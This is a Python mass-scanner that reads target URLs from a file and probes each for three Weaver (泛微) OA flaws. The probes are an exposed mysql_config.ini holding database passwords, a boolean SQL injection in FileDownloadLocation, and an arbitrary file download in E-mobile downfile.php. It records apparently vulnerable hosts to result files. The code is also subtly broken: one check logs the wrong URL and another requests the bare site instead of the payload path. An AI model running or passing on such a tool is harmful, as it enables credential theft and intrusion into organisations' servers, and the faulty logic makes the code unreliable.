
import json
import requests,re


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/mysql_config.ini"
    vulnurl = url + payload

    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if r"datapassword" in req.text:
            print("[+]存在泛微OA 数据库配置泄露漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('数据库配置泄露漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在weaver_oa_db_disclosure漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    true_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=1"
    false_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=2"

    try:
        req1 = requests.get(url + true_url,  timeout=10, verify=False)
        req2 = requests.get(url + false_url,  timeout=10, verify=False)
        if r"attachment" in str(req1.headers) and r"attachment" not in str(req2.headers):
            print("[+]存在泛微OA filedownaction SQL注入漏洞...(高危)\tpayload: " + url + true_url, "red")
            with open('SQL注入漏洞漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在weaver_oa_download_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/E-mobile/Data/downfile.php?url=123"
    vulnurl = url + payload
    try:
        req = requests.get(url,  timeout=10, verify=False)
        if req.status_code == 200:
            m = re.search(r'No error in <b>([^<]+)</b>', req.text)
            if m:
                print("[+]存在泛微OA downfile.php 任意文件下载漏洞...(高危)\tpayload: " + url, "red")
                with open('任意文件下载漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
            else:
                print("[-]不存在weaver_oa_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")